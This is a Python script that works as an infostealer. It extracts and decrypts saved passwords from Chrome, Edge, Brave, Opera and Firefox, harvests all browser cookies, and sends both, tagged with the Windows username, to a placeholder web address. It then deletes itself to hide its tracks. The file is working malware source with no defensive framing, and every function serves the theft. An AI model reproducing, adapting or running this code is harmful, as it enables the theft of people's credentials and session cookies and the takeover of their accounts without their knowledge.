import os
import json
import sqlite3
import shutil
import base64
import requests
import browser_cookie3
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import sys

def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception:
            return ""
    return ""

def get_encryption_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_browser_credentials(browser_name, browser_path):
    credentials = []
    login_db = os.path.join(browser_path, "Default", "Login Data")
    if not os.path.exists(login_db):
        return credentials
    temp_db = "temp_login.db"
    if os.path.exists(temp_db):
        os.remove(temp_db)
    shutil.copyfile(login_db, temp_db)
    key = get_encryption_key(browser_path)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")
        for row in cursor.fetchall():
            credentials.append({
                "browser": browser_name,
                "url": row[0],
                "username": row[1],
                "password": decrypt_password(row[2], key),
                "date_created": get_chrome_datetime(row[3]),
                "date_last_used": get_chrome_datetime(row[4])
            })
    except:
        pass
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_db)
    return credentials

def get_firefox_credentials():
    credentials = []
    profiles_path = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(profiles_path):
        return credentials
    for profile in os.listdir(profiles_path):
        if ".default" in profile:
            profile_path = os.path.join(profiles_path, profile)
            break
    else:
        return credentials
    logins_path = os.path.join(profile_path, "logins.json")
    key4_db = os.path.join(profile_path, "key4.db")
    if not os.path.exists(logins_path) or not os.path.exists(key4_db):
        return credentials
    temp_db = "firefox_temp.db"
    shutil.copyfile(key4_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
        key = CryptUnprotectData(cursor.fetchone()[1], None, None, None, 0)[1]
    except:
        return credentials
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_db)
    try:
        with open(logins_path, "r", encoding="utf-8") as f:
            logins = json.load(f)
        for login in logins.get("logins", []):
            encrypted_password = base64.b64decode(login["password"])
            iv = encrypted_password[:12]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(encrypted_password[12:-16]).decode()
            credentials.append({
                "browser": "Firefox",
                "url": login.get("hostname", ""),
                "username": login.get("username", ""),
                "password": decrypted_password
            })
    except:
        return credentials
    return credentials

def get_all_browser_credentials():
    all_credentials = []
    browsers = {
        "Chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable")
    }
    for name, path in browsers.items():
        if os.path.exists(path):
            all_credentials.extend(get_browser_credentials(name, path))
    all_credentials.extend(get_firefox_credentials())
    return all_credentials

def get_all_browser_cookies():
    all_cookies = []
    browsers = {
        "Chrome": browser_cookie3.chrome,
        "Firefox": browser_cookie3.firefox,
        "Edge": browser_cookie3.edge,
        "Opera": browser_cookie3.opera,
        "Brave": browser_cookie3.brave
    }
    for name, func in browsers.items():
        try:
            cookies = func(domain_name="")
            for cookie in cookies:
                all_cookies.append({
                    "browser": name,
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path,
                    "expires": cookie.expires,
                    "secure": cookie.secure
                })
        except:
            pass
    return all_cookies

# تبدیل datetime به string
def convert_dates(obj):
    if isinstance(obj, datetime):
        return obj.isoformat()  # تبدیل به فرمت ISO 8601
    elif isinstance(obj, list):
        return [convert_dates(item) for item in obj]
    elif isinstance(obj, dict):
        return {k: convert_dates(v) for k, v in obj.items()}
    return obj


def Send(data):
    data = {os.getlogin() : data}
    requests.post("your-website-url", json=data)

def self_delete():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
    except Exception as e:
        pass


def main():

    credentials = convert_dates(get_all_browser_credentials())
    Send(convert_dates(credentials))
    cookies = convert_dates(get_all_browser_cookies())
    Send(convert_dates(cookies))

if __name__ == "__main__":
    main()
    self_delete()
